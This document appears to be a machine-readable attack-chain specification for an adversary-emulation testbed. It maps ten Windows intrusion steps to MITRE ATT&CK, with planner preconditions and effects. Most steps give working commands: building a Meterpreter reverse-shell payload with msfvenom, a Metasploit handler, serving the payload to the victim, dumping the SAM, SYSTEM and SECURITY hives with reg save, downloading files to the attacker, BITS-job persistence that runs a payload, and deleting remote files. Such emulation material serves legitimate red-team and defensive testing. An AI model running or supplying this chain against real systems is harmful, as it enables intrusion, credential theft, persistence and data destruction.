# Chain 018

**Testbed**: `env0` · **Steps**: 10 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Collection, Persistence, Defense Evasion, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1071.001, T1204.002, T1059.003 |
| Discovery | T1082 |
| Credential Access | T1003.002 |
| Collection | T1020 |
| Persistence | T1197 |
| Defense Evasion | T1197, T1070.004, T1485 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Meterpreter session (for Windows) using MSFVenom | MSFVenom Console |
| 2 | Execution, Command and Control | T1071.001 | Set an MSF payload handler for a file-backed payload | Metasploit Executor |
| 3 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 4 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 5 | Discovery | T1082 | Retrieve Environment Variable | Meterpreter Executor |
| 6 | Execution | T1059.003 | Get an Interactive Shell on Windows | Meterpreter Session Derive |
| 7 | Credential Access | T1003.002 | Registry dump of SAM, creds, and secrets | Command Prompt Executor |
| 8 | Collection | T1020 | File Download Operation | Meterpreter Executor |
| 9 | Persistence, Defense Evasion | T1197 | Persist, Download, & Execute | Command Prompt Executor |
| 10 | Defense Evasion, Impact | T1070.004, T1485 | Delete Remote File | Meterpreter Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Meterpreter session (for Windows) using MSFVenom

- **UUID**: `msfvenom-1`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command uses MSFVenom to generate a payload designed for remote access to a target machine.

**Execution** (MSFVenom Console)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe -o #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | no |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`

---

### Step 2 — Set an MSF payload handler for a file-backed payload

- **UUID**: `set-msf-payload-handler-for-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution, Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Windows Command Shell, Ingress Tool Transfer, Non-Standard Por

**Description**

Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
for the case where the meterpreter payload has been (or will be) staged as a
file on the victim.

This variant additionally grants `(callback-covered ?file)` for the payload's
file — the gate that every execute-* action requires before running that file.
Payload-genesis actions (msfvenom) deliberately do NOT produce
`callback-covered`, so payload files are born uncovered; firing this action
is what makes them safe to execute. This forces the planner to sequence
handler-set before any execute-* on the payload file — the ordering
constraint is encoded directly in PDDL preconditions.

Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
loading, in-memory shellcode injection, staged callback with no on-disk
artifact.

**Execution** (Metasploit Executor)

```
exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
                            payload_module_name = "#{payload_name}",
                            listening_host = "#{LHOST}",
                            listening_port = "#{LPORT}"):
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | no |
| `LPORT` | listening port of the attacter machine | — | no |
| `payload_name` | payload type set by msf | — | no |

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`

**Effects**

- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 3 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 4 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Retrieve Environment Variable

- **UUID**: `meterpreter-getenv`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1082
- **Technique(s)**: System Information Discovery

**Description**

The `getenv` command retrieves the value of an environment variable on the remote target.

**Execution** (Meterpreter Executor)

```
getenv(var_name=#{name}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `name` | Name of the environment variable to query | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(system-information-info-known ?target - host)`

---

### Step 6 — Get an Interactive Shell on Windows

- **UUID**: `meterpreter-shell-windows`
- **Source**: Metasploit
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: {'Command and Scripting Interpreter': 'Windows Command Shell'}

**Description**

The `shell` command in a Windows meterpreter session drops into an interactive cmd.exe.

**Execution** (Meterpreter Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `executor_parent` | Parent meterpreter session ID | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 7 — Registry dump of SAM, creds, and secrets

- **UUID**: `art-t1003_002-reg-save-sam`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
target-side directory (default `%TEMP%`). The hives hold encrypted /
structured credential material — offline processing (impacket-
secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
modelled by this action. A chain that wants to close the credential-
access stage via this path must include downstream file exfil +
offline-parse actions. ART auto_generated_guid
5c2571d0-1572-416d-9676-812e64ca9f44.

**Execution** (Command Prompt Executor)

```
reg save HKLM\sam #{save_dir}\sam
reg save HKLM\system #{save_dir}\system
reg save HKLM\security #{save_dir}\security
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg save. | — | yes |
| `save_dir` | Directory on the target where the SAM / SYSTEM / SECURITY hives are written. | %TEMP% | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-in-file ?d - data ?f - file)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(callback-covered ?f - file)`

---

### Step 8 — File Download Operation

- **UUID**: `meterpreter-download`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Collection
- **MITRE ID(s)**: T1020
- **Technique(s)**: Data from Local System

**Description**

The `download` command transfers files from the target system to the attacker machine.

**Execution** (Meterpreter Executor)

```
download(remote_path=#{remote_path}, local_path=#{output_dir}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `remote_path` | Full path to remote file/directory | — | yes |
| `output_dir` | Local directory to save files | /tmp | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`
- `(file-exists ?remote_path - string ?file - file ?target - host)`

**Effects**

- `(file-on-attacker ?localpath - string ?file - file)`

---

### Step 9 — Persist, Download, & Execute

- **UUID**: `art-t1197-bits-notifycmdline`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence, Defense Evasion
- **MITRE ID(s)**: T1197
- **Technique(s)**: BITS Jobs

**Description**

Abuses BITS `/setnotifycmdline` to trigger a command whenever the
BITS transfer state changes — the transfer is used as a persistence
vehicle (the notify command fires under the BITS service context).
Original ART hardcodes notepad.exe as the notify command; parameterised.
ART auto_generated_guid 62a06ec5-5754-47d2-bcfc-123d8314c6ae.

**Execution** (Command Prompt Executor)

```
bitsadmin.exe /create "#{bits_job_name}"
bitsadmin.exe /addfile "#{bits_job_name}" "#{remote_file}" "#{local_file}"
bitsadmin.exe /setnotifycmdline "#{bits_job_name}" "#{command_path}" NULL
bitsadmin.exe /resume "#{bits_job_name}"
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete "#{bits_job_name}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke bitsadmin. | — | yes |
| `bits_job_name` | BITS job name. | AtomicBITS | yes |
| `remote_file` | URL of a file for BITS to download (payload delivery vehicle). | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md | yes |
| `local_file` | Target-side destination for the BITS download. | C:\\Users\\Public\\bits_download.dat | yes |
| `command_path` | Command invoked via `/setnotifycmdline` on BITS state change. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`

**Effects**

- `(command-execution-at-event ?c - string ?target - host)`

---

### Step 10 — Delete Remote File

- **UUID**: `meterpreter-delete`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: {'Indicator Removal': 'File Deletion'}, Data Destruction

**Description**

The `delete` command removes a file from the remote system.

**Execution** (Meterpreter Executor)

```
delete(file_path=#{RemotePath}, meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `RemotePath` | Remote path of the file to delete | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
